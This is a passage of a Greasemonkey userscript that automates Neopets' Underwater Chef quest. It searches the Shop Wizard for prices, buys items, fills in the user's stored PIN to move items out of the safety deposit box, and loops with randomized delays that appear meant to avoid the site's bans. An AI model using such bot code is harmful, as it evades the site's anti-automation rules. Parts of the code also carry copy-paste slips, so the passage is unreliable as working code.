										GM_setValue("gotstat", GM_getValue("gotstat", 0) + 1);
										writeToLog("<b>[" + document.getElementById("nst").innerHTML + "] Quest completed! <font color=#E42217>Your pet has become better at Attack</font>!!!</b>");
									};
								};
							};
						};
					};
				};
			};
			if (GM_getValue("repeatQ", "unchecked") == "unchecked") {
				document.getElementById("startQuestButton").click();
				writeToLog("Single quest complete, shutting down...<br>");
			} else {
				reset();
				writeToLog("<b><font color=#E42217>Option checked: </font></b>Quest complete, starting next one...<br>");
				setTimeout("document.location = 'http://www.neopets.com/island/kitchen.phtml'", RefreshRate());
			};
		} else {
			setTimeout("document.location = 'http://www.neopets.com/island/kitchen.phtml'", RefreshRate());
		};
	};
	if (document.location.href == "http://www.neopets.com/process_safetydeposit.phtml?checksub=scan" || document.location.href == "http://www.neopets.com/process_bank.phtml") {
		if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
			writeToLog("<font color=#E42217><b>WRONG PIN!!! SET CORRECT PIN PLEASE! TERMINATING...</b></font><br>");
			document.getElementById("startQuestButton").click();
		};
	};
	if (document.location.href == "http://www.neopets.com/market.phtml?type=wizard" && GM_getValue("number_itemsNeeded", 0) != 0) {
		GM_setValue("Started", 0);
		ShopWizard();
	};
	if (document.location.href == "http://www.neopets.com/objects.phtml?type=inventory" && GM_getValue("doneBuying", 0) == 1) {
		writeToLog("Final inventory check:");
		for (var i = 1; i < 5; i++) {
			var iteminventory = GM_getValue("itemnameINV" + i, "");
			if (iteminventory != "") {
				var x = document.evaluate("//td[contains(@class, \"contentModuleContent\")]/table/tbody//tr//td[text()= \"" + iteminventory + "\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
				var y = document.evaluate("//td[contains(@class, \"contentModuleContent\")]/table/tbody//tr//td[text()= \"" + iteminventory + "\"]//b", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
				var a = document.evaluate("//td[contains(@class, \"contentModuleContent\")]/table/tbody//tr//td[text()= \"" + iteminventory + "\"]//b[text() = '(trading)']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
				var b = document.evaluate("//td[contains(@class, \"contentModuleContent\")]/table/tbody//tr//td[text()= \"" + iteminventory + "\"]//b[text() = '(auctioned)']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
				var available = 0;
				if (x.snapshotItem(0) != null) {
					if (y.snapshotItem(0) == null) {
						writeToLog("Found <b>" + iteminventory + " </b> in inventory.");
						var available = 1;
					} else {
						for (var j = 0; j < x.snapshotLength; j++) {
							if ((a.snapshotItem(j) || b.snapshotItem(j)) != null && available == 0) {} else {
								writeToLog("Found <b>" + iteminventory + " </b> in inventory.");
								var available = 1;
							};
						};
					};
				} else {
					var available = 0;
				};
				if (available == 1) {
					var ab = GM_getValue("numberValidInv", "0") + 1;
					GM_setValue("numberValidInv", ab);
				};
			};
		};
		writeToLog(" ");
		if (GM_getValue("numberValidInv", "0") == GM_getValue("TotalItems", "0")) {
			GM_setValue("readyFinish", 1);
			GM_setValue("OneDone", 1);
			writeToLog("All items present in inventory, going back to Underwater Chef.");
			setTimeout("document.location = 'http://www.neopets.com/island/kitchen.phtml'", RefreshRate());
		};
	} else {
		if (document.location.href == "http://www.neopets.com/objects.phtml?type=inventory" && GM_getValue("doneBuying", 0) == 0) {
			if (GM_getValue("QS", "unchecked") == "checked" && (inv_number = parseInt(GetBetween(document.body.innerHTML, "You currently hold <b>", "</b> items"))) >= 45) {
				GM_setValue("DoQS", 1);
				GM_setValue("QSnumber", inv_number - 44);
				writeToLog("<b><font color=#E42217>Option checked: </font>Inventory contains " + inv_number + " items, max allowed is 44. Moving " + (inv_number - 44) + " items to SDB.</b>");
				setTimeout("document.location = 'http://www.neopets.com/quickstock.phtml'", RefreshRate());
			} else {
				writeToLog("Checking inventory for possible present items.");
				var abc = new Array();
				GM_setValue("itemnameSDB1", GM_getValue("itemname1"));
				GM_setValue("itemnameSDB2", GM_getValue("itemname2"));
				GM_setValue("itemnameSDB3", GM_getValue("itemname3"));
				GM_setValue("itemnameSDB4", GM_getValue("itemname4"));
				for (var i = 1; i < 5; i++) {
					var iteminventory = GM_getValue("itemname" + i, "");
					if (iteminventory != "") {
						var x = document.evaluate("//td[contains(@class, \"contentModuleContent\")]/table/tbody//tr//td[text()= \"" + iteminventory + "\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
						var y = document.evaluate("//td[contains(@class, \"contentModuleContent\")]/table/tbody//tr//td[text()= \"" + iteminventory + "\"]//b", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
						var a = document.evaluate("//td[contains(@class, \"contentModuleContent\")]/table/tbody//tr//td[text()= \"" + iteminventory + "\"]//b[text() = '(trading)']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
						var b = document.evaluate("//td[contains(@class, \"contentModuleContent\")]/table/tbody//tr//td[text()= \"" + iteminventory + "\"]//b[text() = '(auctioned)']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
						var available = 0;
						if (x.snapshotItem(0) != null) {
							if (y.snapshotItem(0) == null) {
								writeToLog("Found <b>" + GM_getValue("itemnameSDB" + i) + " </b> in inventory.");
								GM_setValue("itemnameSDB" + i, "");
							} else {
								for (var j = 0; j < x.snapshotLength; j++) {
									if ((a.snapshotItem(j) || b.snapshotItem(j)) != null && available == 0) {} else {
										writeToLog("Found <b>" + GM_getValue("itemnameSDB" + i) + " </b> in inventory.");
										GM_setValue("itemnameSDB" + i, "");
									};
								};
							};
						};
						if (GM_getValue("itemnameSDB" + i, "") != "") {
							abc.push(GM_getValue("itemnameSDB" + i, ""));
						};
					};
				};
				GM_setValue("itemsNeeded", abc.join("/"));
				GM_setValue("number_itemsNeeded", abc.length);
				if (abc.length == 1) {
					GM_setValue("itemname4", abc[0]);
				} else {
					if (abc.length == 2) {
						GM_setValue("itemname3", abc[0]);
						GM_setValue("itemname4", abc[1]);
					} else {
						if (abc.length == 3) {
							GM_setValue("itemname2", abc[0]);
							GM_setValue("itemname3", abc[1]);
							GM_setValue("itemname4", abc[2]);
						} else {
							if (abc.length == 4) {
								GM_setValue("itemname1", abc[0]);
								GM_setValue("itemname2", abc[1]);
								GM_setValue("itemname3", abc[2]);
								GM_setValue("itemname4", abc[3]);
							};
						};
					};
				};
				GM_setValue("klaarSDB", 0);
				if (abc.length == 0) {
					GM_setValue("OneDone", 1);
					GM_setValue("readyFinish", 1);
					setTimeout("document.location = 'http://www.neopets.com/island/kitchen.phtml'", RefreshRate());
					writeToLog("All items present in inventory, going back to Underwater Chef.");
				} else {
					writeToLog("<br>Starting with gathering lowest prices.");
					setTimeout("document.location = 'http://www.neopets.com/market.phtml?type=wizard'", RefreshRate());
				};
			};
		};
	};
};
if (GM_getValue("itemfilled", 0) == 1 && document.location.href == "http://www.neopets.com/market.phtml") {
	allDivs = document.evaluate("//span[@style=\"font-size: 14pt;\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	for (var i = 0, thisDiv; thisDiv = allDivs.snapshotItem(i); i++) {
		itemname = thisDiv.textContent;
		if (itemname != "...") {
			var redoSearch = document.createElement("div");
			redoSearch.innerHTML = "<br><form action=\"market.phtml\" method=\"post\"><input type=\"hidden\" name=\"type\" value=\"process_wizard\"><input type=\"hidden\" name=\"feedset\" value=\"0\"><input type=\"hidden\" name=\"shopwizard\" value=\"" + itemname.toLowerCase() + "\"><input type=\"hidden\" name=\"table\" value=\"shop\"><input type=\"hidden\" name=\"criteria\" value=\"exact\"><input type=\"hidden\" name=\"min_price\" value=\"0\"><input type=\"hidden\" name=\"max_price\" value=\"99999\"><input type=\"submit\" value=\"" + itemname + "\"></form><br>";
			redoSearch.style.visibility = "hidden";
			thisDiv.parentNode.parentNode.insertBefore(redoSearch, thisDiv.parentNode.lastChild.nextSibling);
		};
	};
	if (GM_getValue("refreshed", 0) < GM_getValue("number_refresh", 0) - 1) {
		AddShoplinksToArray();
		SortItems();
		GM_setValue("refreshed", GM_getValue("refreshed", 0) + 1);
		setTimeout(function() {
			redoSearch.getElementsByTagName("form")[0].submit();
		},
		RefreshRate());
	} else {
		AddShoplinksToArray();
		SortItems();
		if (GM_getValue("item" + GM_getValue("number_itemsNeeded", 0)) == "") {
			writeToLog("Could not find any buyable <b>" + GM_getValue("current_item", "") + "</b>, terminating quest.<br>");
			if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
				document.getElementById("startQuestButton").click();
			};
		} else {
			CalculateTotalPrice();
			GM_setValue("results_array", "");
			GM_setValue("number_itemsNeeded", GM_getValue("number_itemsNeeded", 0) - 1);
			GM_setValue("itemfilled", 0);
			GM_setValue("Started", 1);
			GM_setValue("refreshed", 0);
			if (GM_getValue("number_itemsNeeded") == 0) {
				GM_setValue("spentONquest", GM_getValue("TotalPrice"));
				if (GM_getValue("TotalPrice") > GM_getValue("max_total_price")) {
					GM_setValue("ContBut", "visible");
					continueQuestButton.style.visibility = GM_getValue("ContBut", "hidden");
					GM_setValue("visi", "visible");
					mainbox.style.visibility = GM_getValue("visi");
					GM_setValue("temp", 1);
					GM_setValue("Started", 0);
					GM_setValue("klaarSDB", 1);
					writeToLog("Total price (<b>" + GM_getValue("TotalPrice") + " NP</b>) is higher than maximum allowed by you(<b>" + GM_getValue("max_total_price") + " NP</b>)<br>Click <b>'DO QUEST ANYWAY'</b> if you still wish to complete it.");
					if (GM_getValue("EdnaWait", 0) == 1) {
						GM_setValue("Idle", 1);
						Idling();
						var nst = document.getElementById("nst").innerHTML;
						var minutes = parseInt(nst.split(":")[1].split(":")[0]);
						var hours = parseInt(nst.split(":")[0]);
						var x = GM_getValue("end_hour", 0) * 60 + GM_getValue("end_min", 0);
						var y = hours * 60 + minutes;
						if (x - y < 0) {
							var diff_min = x + 12 * 60 - y;
						} else {
							if (x - y >= 0) {
								var diff_min = x - y;
							};
						};
						uren = parseInt(diff_min / 60);
						minuten = diff_min % 60;
						var totalmin = minutes + minuten;
						if (totalmin >= 60) {
							var totalmin = totalmin - 60;
							var totalhour = 1;
						} else {
							var totalhour = 0;
						};
						var totalhour = totalhour + uren + hours;
						var dayhalf = nst.split(" ")[1];
						if (totalhour > 12) {
							var totalhour = totalhour - 12;
							if (dayhalf == "pm") {
								var dayhalf = "am";
							} else {
								var dayhalf = "pm";
							};
						};
						if (totalmin <= 9) {
							writeToLog("<b><font color=#E42217>Option checked: </font></b>Or just let this script idle until the quest times out.<br><b>It is now [" + document.getElementById("nst").innerHTML + "] A new quest will be started automatically in <font color=#E42217>" + uren + " hr(s) and " + minuten + " min(s)</font> or at approximately [" + totalhour + ":0" + totalmin + ":00 " + dayhalf + " NST]</b>");
						} else {
							writeToLog("<b><font color=#E42217>Option checked: </font></b>Or just let this script idle until the quest times out.<br><b>It is now [" + document.getElementById("nst").innerHTML + "] A new quest will be started automatically in <font color=#E42217>" + uren + " hr(s) and " + minuten + " min(s)</font> or at approximately [" + totalhour + ":" + totalmin + ":00 " + dayhalf + " NST]</b>");
						};
						setTimeout(SingleTabQuestTimeout, diff_min * 60 * 1000);
					};
				} else {
					GM_setValue("getURL", 1);
					writeToLog("<br>Total price for items is <b>" + GM_getValue("TotalPrice") + " NP.</b> which is OK! Purchase of items started!");
				};
			} else {
				setTimeout("document.location = 'http://www.neopets.com/market.phtml?type=wizard'", RefreshRate());
			};
		};
	};
};
if (GM_getValue("InShop", 0) == 1) {
	var currentPage = location.href.split("/")[3];
	if (currentPage.substr(0, 17) == "browseshop.phtml?") {
		var x = document.evaluate("//table[not(contains(@cellpadding, \"3\"))]/tbody/tr/td/a[contains(@href, \"buy_item\")]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		if ((document.body.innerHTML.indexOf("Item not found!") != -1 && GM_getValue("tryBuy", 0) == 0) || (document.body.innerHTML.indexOf("There are no items for sale in this shop!") != -1 && GM_getValue("tryBuy", 0) == 0)) {
			GM_setValue("getURL", 1);
			GM_setValue("getNewURL", 1);
			GM_setValue("InShop", 0);
			writeToLog("Item was sold in meanwhile, buying second to cheapest");
		} else {
			if (x.snapshotItem(0) != null && GM_getValue("tryBuy", 0) == 0) {
				var strHTML = document.body.innerHTML;
				GM_setValue("numberstocked", parseInt(GetBetween(strHTML, "<b>" + GM_getValue("itemnamebuy") + "</b><br>", " in stock<br>")));
				GM_setValue("tryBuy", 1);
				setTimeout(function() {
					document.location = x.snapshotItem(0).toString();
				},
				RefreshRate());
			} else {
				if (x.snapshotItem(0) != null && GM_getValue("tryBuy", 0) == 1) {
					if (GM_getValue("numberstocked") > 1) {
						var strHTML = document.body.innerHTML;
						GM_setValue("numberstocked2", parseInt(GetBetween(strHTML, "<b>" + GM_getValue("itemnamebuy") + "</b><br>", " in stock<br>")));
						writeToLog("<b>" + GM_getValue("itemnamebuy") + "</b> was bought successfully for <b>" + GM_getValue("tempPrice") + " NP</b>!");
						if (GM_getValue("numberstocked2") < GM_getValue("numberstocked")) {
							if (GM_getValue("itembuying", 0) == 4) {
								GM_setValue("item4", "");
							} else {
								if (GM_getValue("itembuying", 0) == 3) {
									GM_setValue("item3", "");
								} else {
									if (GM_getValue("itembuying", 0) == 2) {
										GM_setValue("item2", "");
									} else {
										if (GM_getValue("itembuying", 0) == 1) {
											GM_setValue("item1", "");
										};
									};
								};
							};
							GM_setValue("InShop", 0);
							GM_setValue("getURL", 1);
							GM_setValue("tryBuy", 0);
						};
					};
				} else {
					if ((document.body.innerHTML.indexOf("Item not found!") != -1 && GM_getValue("tryBuy", 0) == 1) || (document.body.innerHTML.indexOf("There are no items for sale in this shop!") != -1 && GM_getValue("tryBuy", 0) == 1)) {
						writeToLog("<b>" + GM_getValue("itemnamebuy") + "</b> was bought successfully for <b>" + GM_getValue("tempPrice") + " NP</b>!");
						if (GM_getValue("itembuying", 0) == 4) {
							GM_setValue("item4", "");
						} else {
							if (GM_getValue("itembuying", 0) == 3) {
								GM_setValue("item3", "");
							} else {
								if (GM_getValue("itembuying", 0) == 2) {
									GM_setValue("item2", "");
								} else {
									if (GM_getValue("itembuying", 0) == 1) {
										GM_setValue("item1", "");
									};
								};
							};
						};
						GM_setValue("InShop", 0);
						GM_setValue("getURL", 1);
						GM_setValue("tryBuy", 0);
					};
				};
			};
		};
	};
};
if (GM_getValue("getURL", 0) == 1 && GM_getValue("tryBuy", 0) == 0) {
	if (GM_getValue("item4", "") != "") {
		var arr_temp = GM_getValue("item4").split("|");
		if (GM_getValue("getNewURL", 0) == 1) {
			arr_temp.splice(0, 1);
			GM_setValue("getNewURL", 0);
		};
		GM_setValue("shopURL", arr_temp[0]);
		GM_setValue("getURL", 0);
		GM_setValue("InShop", 1);
		GM_setValue("itembuying", 4);
		GM_setValue("itemnamebuy", GM_getValue("itemname1"));
		GM_setValue("tempPrice", arr_temp[0].split("cost_neopoints=")[1]);
		setTimeout(function() {
			document.location = GM_getValue("shopURL");
		},
		RefreshRate());
	} else {
		if (GM_getValue("item3", "") != "") {
			var arr_temp = GM_getValue("item3").split("|");
			if (GM_getValue("getNewURL", 0) == 1) {
				arr_temp.splice(0, 1);
				GM_setValue("getNewURL", 0);
			};
			GM_setValue("shopURL", arr_temp[0]);
			GM_setValue("getURL", 0);
			GM_setValue("InShop", 1);
			GM_setValue("itembuying", 3);
			GM_setValue("itemnamebuy", GM_getValue("itemname2"));
			GM_setValue("tempPrice", arr_temp[0].split("cost_neopoints=")[1]);
			setTimeout(function() {
				document.location = GM_getValue("shopURL");
			},
			RefreshRate());
		} else {
			if (GM_getValue("item2", "") != "") {
				var arr_temp = GM_getValue("item2").split("|");
				if (GM_getValue("getNewURL", 0) == 1) {
					arr_temp.splice(0, 1);
					GM_setValue("getNewURL", 0);
				};
				GM_setValue("shopURL", arr_temp[0]);
				GM_setValue("getURL", 0);
				GM_setValue("InShop", 1);
				GM_setValue("itembuying", 2);
				GM_setValue("itemnamebuy", GM_getValue("itemname3"));
				GM_setValue("tempPrice", arr_temp[0].split("cost_neopoints=")[1]);
				setTimeout(function() {
					document.location = GM_getValue("shopURL");
				},
				RefreshRate());
			} else {
				if (GM_getValue("item1", "") != "") {
					var arr_temp = GM_getValue("item1").split("|");
					if (GM_getValue("getNewURL", 0) == 1) {
						arr_temp.splice(0, 1);
						GM_setValue("getNewURL", 0);
					};
					GM_setValue("shopURL", arr_temp[0]);
					GM_setValue("getURL", 0);
					GM_setValue("InShop", 1);
					GM_setValue("itembuying", 1);
					GM_setValue("itemnamebuy", GM_getValue("itemname4"));
					GM_setValue("tempPrice", arr_temp[0].split("cost_neopoints=")[1]);
					setTimeout(function() {
						document.location = GM_getValue("shopURL");
					},
					RefreshRate());
				} else {
					GM_setValue("InShop", 0);
					GM_setValue("getURL", 0);
					GM_setValue("doneBuying", 1);
					writeToLog("You have bought all items needed!");
					setTimeout("document.location = 'http://www.neopets.com/objects.phtml?type=inventory'", RefreshRate());
				};
			};
		};
	};
};
if (document.location.href.split("/")[3].substr(0, 19) == "safetydeposit.phtml" && GM_getValue("klaarSDB", 0) == 0 && GM_getValue("Started", 0) == 1) {
	if (GM_getValue("itemnameSDB4") != "") {
		if (GM_getValue("searching", 0) == 0) {
			document.getElementsByName("obj_name")[0].value = GM_getValue("itemnameSDB4");
			GM_setValue("searching", 1);
			setTimeout(function() {
				document.evaluate("//input[@type = \"submit\" and @value = \"Find\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
			},
			RefreshRate());
		} else {
			if (GM_getValue("searching", 0) == 1) {
				if (document.body.innerHTML.indexOf("Not finding any items with that criteria!") > -1) {
					setTimeout("document.location = 'http://www.neopets.com/safetydeposit.phtml'", RefreshRate());
				} else {
					if (document.body.innerHTML.indexOf("<b>" + GM_getValue("itemnameSDB4") + "<br>") > -1) {
						var itemsSDB = document.evaluate("//form//td[contains(@align, \"left\")]/b/.[text() = \"" + GM_getValue("itemnameSDB3") + "\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
						itemsSDB.snapshotItem(0)["parentNode"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["firstChild"]["nextSibling"]["value"] = 1;
						GM_setValue("searching", 0);
						writeToLog("Found <b>" + GM_getValue("itemnameSDB3") + "</b> in SDB, moving to inventory...");
						GM_setValue("itemnameSDB4", "");
						if (document.body.innerHTML.indexOf("<b>Add a PIN</b></a> for use in this area!") == -1) {
							document.evaluate("//input[@type = \"password\" and @name = \"pin\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0)["value"] = GM_getValue("PIN", 1234);
						};
						setTimeout(function() {
							document.evaluate("//input[@type = \"submit\" and @value = \"Move Selected Items\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
						},
						RefreshRate());
					};
				};
				GM_setValue("searching", 0);
				GM_setValue("itemnameSDB4", "");
			};
		};
	} else {
		if (GM_getValue("itemnameSDB3") != "") {
			if (GM_getValue("searching", 0) == 0) {
				document.getElementsByName("obj_name")[0].value = GM_getValue("itemnameSDB3");
				GM_setValue("searching", 1);
				setTimeout(function() {
					document.evaluate("//input[@type = \"submit\" and @value = \"Find\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
				},
				RefreshRate());
			} else {
				if (GM_getValue("searching", 0) == 1) {
					if (document.body.innerHTML.indexOf("Not finding any items with that criteria!") > -1) {
						setTimeout("document.location = 'http://www.neopets.com/safetydeposit.phtml'", RefreshRate());
					} else {
						if (document.body.innerHTML.indexOf("<b>" + GM_getValue("itemnameSDB3") + "<br>") > -1) {
							var itemsSDB = document.evaluate("//form//td[contains(@align, \"left\")]/b/.[text() = \"" + GM_getValue("itemnameSDB3") + "\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
							itemsSDB.snapshotItem(0)["parentNode"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["firstChild"]["nextSibling"]["value"] = 1;
							GM_setValue("searching", 0);
							writeToLog("Found <b>" + GM_getValue("itemnameSDB3") + "</b> in SDB, moving to inventory...");
							GM_setValue("itemnameSDB3", "");
							if (document.body.innerHTML.indexOf("<b>Add a PIN</b></a> for use in this area!") == -1) {
								document.evaluate("//input[@type = \"password\" and @name = \"pin\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0)["value"] = GM_getValue("PIN", 1234);
							};
							setTimeout(function() {
								document.evaluate("//input[@type = \"submit\" and @value = \"Move Selected Items\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
							},
							RefreshRate());
						};
					};
					GM_setValue("searching", 0);
					GM_setValue("itemnameSDB3", "");
				};
			};
		} else {
			if (GM_getValue("itemnameSDB2") != "") {
				if (GM_getValue("searching", 0) == 0) {
					document.getElementsByName("obj_name")[0].value = GM_getValue("itemnameSDB2");
					GM_setValue("searching", 1);
					setTimeout(function() {
						document.evaluate("//input[@type = \"submit\" and @value = \"Find\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
					},
					RefreshRate());
				} else {
					if (GM_getValue("searching", 0) == 1) {
						if (document.body.innerHTML.indexOf("Not finding any items with that criteria!") > -1) {
							setTimeout("document.location = 'http://www.neopets.com/safetydeposit.phtml'", RefreshRate());
						} else {
							if (document.body.innerHTML.indexOf("<b>" + GM_getValue("itemnameSDB2") + "<br>") > -1) {
								var itemsSDB = document.evaluate("//form//td[contains(@align, \"left\")]/b/.[text() = \"" + GM_getValue("itemnameSDB2") + "\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
								itemsSDB.snapshotItem(0)["parentNode"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["firstChild"]["nextSibling"]["value"] = 1;
								GM_setValue("searching", 0);
								writeToLog("Found <b>" + GM_getValue("itemnameSDB2") + "</b> in SDB, moving to inventory...");
								GM_setValue("itemnameSDB2", "");
								if (document.body.innerHTML.indexOf("<b>Add a PIN</b></a> for use in this area!") == -1) {
									document.evaluate("//input[@type = \"password\" and @name = \"pin\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0)["value"] = GM_getValue("PIN", 1234);
								};
								setTimeout(function() {
									document.evaluate("//input[@type = \"submit\" and @value = \"Move Selected Items\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
								},
								RefreshRate());
							};
						};
						GM_setValue("searching", 0);
						GM_setValue("itemnameSDB2", "");
					};
				};
			} else {
				if (GM_getValue("itemnameSDB1") != "") {
					if (GM_getValue("searching", 0) == 0) {
						document.getElementsByName("obj_name")[0].value = GM_getValue("itemnameSDB1");
						GM_setValue("searching", 1);
						setTimeout(function() {
							document.evaluate("//input[@type = \"submit\" and @value = \"Find\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
						},
						RefreshRate());
					} else {
						if (GM_getValue("searching", 0) == 1) {
							if (document.body.innerHTML.indexOf("Not finding any items with that criteria!") > -1) {
								setTimeout("document.location = 'http://www.neopets.com/safetydeposit.phtml'", RefreshRate());
							} else {
								if (document.body.innerHTML.indexOf("<b>" + GM_getValue("itemnameSDB1") + "<br>") > -1) {
									var itemsSDB = document.evaluate("//form//td[contains(@align, \"left\")]/b/.[text() = \"" + GM_getValue("itemnameSDB1") + "\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
									itemsSDB.snapshotItem(0)["parentNode"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["nextSibling"]["firstChild"]["nextSibling"]["value"] = 1;
									GM_setValue("searching", 0);
									writeToLog("Found <b>" + GM_getValue("itemnameSDB1") + "</b> in SDB, moving to inventory...");
									GM_setValue("itemnameSDB1", "");
									if (document.body.innerHTML.indexOf("<b>Add a PIN</b></a> for use in this area!") == -1) {
										document.evaluate("//input[@type = \"password\" and @name = \"pin\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0)["value"] = GM_getValue("PIN", 1234);
									};
									setTimeout(function() {
										document.evaluate("//input[@type = \"submit\" and @value = \"Move Selected Items\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
									},
									RefreshRate());
								};
							};
							GM_setValue("searching", 0);
							GM_setValue("itemnameSDB1", "");
						};
					};
				} else {
					GM_setValue("klaarSDB", 1);
					setTimeout("document.location = 'http://www.neopets.com/objects.phtml?type=inventory'", RefreshRate());
				};
			};
		};
	};
};

function SortItems() {
	var VARIABLE_1 = GM_getValue("results_array", "").split("|");
	var VARIABLE_2 = new Array();
	var i, j;
	for (j = 0; j < VARIABLE_1.length; j++) {
		var VARIABLE_3 = 100000;
		for (i = 0; i < VARIABLE_1.length; i++) {
			if (parseInt(VARIABLE_1[i].split("cost_neopoints=")[1]) < VARIABLE_3) {
				var VARIABLE_3 = parseInt(VARIABLE_1[i].split("cost_neopoints=")[1]);
				var VARIABLE_4 = VARIABLE_1[i];
				var VARIABLE_5 = i;
			};
		};
		if (VARIABLE_1[VARIABLE_5] != "buy_cost_neopoints=100000") {
			VARIABLE_2.push(VARIABLE_4);
			VARIABLE_1.splice(VARIABLE_5, 1, "buy_cost_neopoints=100000");
		};
	};
	GM_setValue("results_array", VARIABLE_2.join("|"));
	var VARIABLE_1 = GM_getValue("results_array", "").split("|");
	VARIABLE_1 = unique(VARIABLE_1);
	VARIABLE_1.splice(10);
	GM_setValue("item" + GM_getValue("number_itemsNeeded", 0), VARIABLE_1.join("|"));
};

function ShopWizard() {
	if ((document.body.innerHTML.indexOf("What are you looking for?") && document.body.innerHTML.indexOf("http://images.neopets.com/shopkeepers/shopwizard.gif")) > -1) {
		if (GM_getValue("itemfilled", 0) == 0) {
			arr_splitted = GM_getValue("itemsNeeded").split("/");
			GM_setValue("current_item", arr_splitted[0]);
			arr_splitted.splice(0, 1);
			var items_needed_string = arr_splitted.join("/");
			GM_setValue("itemsNeeded", items_needed_string);
			document.getElementsByName("shopwizard")[0].value = GM_getValue("current_item", "");
			document.getElementsByName("min_price")[0].value = 0;
			document.getElementsByName("max_price")[0].value = 99999;
			document.getElementsByTagName("select")[0].selectedIndex = 1;
			document.getElementsByName("table")[0].checked = true;
			GM_setValue("itemfilled", 1);
			writeToLog("Gathering prices for <b>" + GM_getValue("current_item", "") + "</b>");
			setTimeout(function() {
				document.evaluate("//div/input[@type = \"submit\" and @value = \"Search\"]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).click();
			},
			RefreshRate());
		};
	};
};

function saveSettings() {
	if (GM_getValue("buttontext", "START QUEST") == "START QUEST") {
		GM_setValue("SDB", (document.getElementById("SDB").checked == true) ? "checked" : "unchecked");
		GM_setValue("repeatQ", (document.getElementById("repeatQ").checked == true) ? "checked" : "unchecked");
		GM_setValue("DoBank", (document.getElementById("DoBank").checked == true) ? "checked" : "unchecked");
		GM_setValue("TimeOutSW", (document.getElementById("TimeOutSW").checked == true) ? "checked" : "unchecked");
		GM_setValue("DoSWBan", (document.getElementById("TimeOutSW").checked == true) ? 1 : 0);
		GM_setValue("TimeOutEdna", (document.getElementById("TimeOutEdna").checked == true) ? "checked" : "unchecked");
		GM_setValue("EdnaWait", (document.getElementById("TimeOutEdna").checked == true) ? 1 : 0);
		GM_setValue("QS", (document.getElementById("QS").checked == true) ? "checked" : "unchecked");
		GM_setValue("frozen", (document.getElementById("frozen").checked == true) ? "checked" : "unchecked");
		GM_setValue("AlertMe", (document.getElementById("AlertMe").checked == true) ? "checked" : "unchecked");
		GM_setValue("buttontext", "STOP QUEST");
		GM_setValue("number_refresh", document.getElementById("number_refresh").value);
		GM_setValue("bottomTime", document.getElementById("bottomTime").value);
		GM_setValue("topTime", document.getElementById("topTime").value);
		var regExp = /,/g;
		var VARIABLE_6 = /\./g;
		var VARIABLE_7 = document.getElementById("max_total_price").value;
		if (VARIABLE_7.match(regExp)) {
			var VARIABLE_7 = VARIABLE_7.replace(regExp, "");
			if (VARIABLE_7.match(VARIABLE_6)) {
				var VARIABLE_7 = VARIABLE_7.replace(VARIABLE_6, "");
			};
		} else {
			if (VARIABLE_7.match(VARIABLE_6)) {
				var VARIABLE_7 = VARIABLE_7.replace(VARIABLE_6, "");
			};
		};
		GM_setValue("max_total_price", parseInt(VARIABLE_7));
		var VARIABLE_8 = document.getElementById("ATMvalue").value;
		if (VARIABLE_8.match(regExp)) {
			var VARIABLE_8 = VARIABLE_8.replace(regExp, "");
			if (VARIABLE_8.match(VARIABLE_6)) {
				var VARIABLE_8 = VARIABLE_8.replace(VARIABLE_6, "");
			};
		} else {
			if (VARIABLE_8.match(VARIABLE_6)) {
				var VARIABLE_8 = VARIABLE_8.replace(VARIABLE_6, "");
			};
		};
		GM_setValue("ATMvalue", parseInt(VARIABLE_8));
		GM_setValue("Started", 1);
		GM_setValue("hourWait", 0);
		GM_setValue("ContBut", "hidden");
		ResetNames();
		CommonResets();
		GM_setValue("PIN", document.getElementById("PIN").value);
		document.location = "http://www.neopets.com/island/kitchen.phtml";
	} else {
		if (GM_getValue("buttontext", "START QUEST") == "STOP QUEST") {
			GM_setValue("Started", 0);
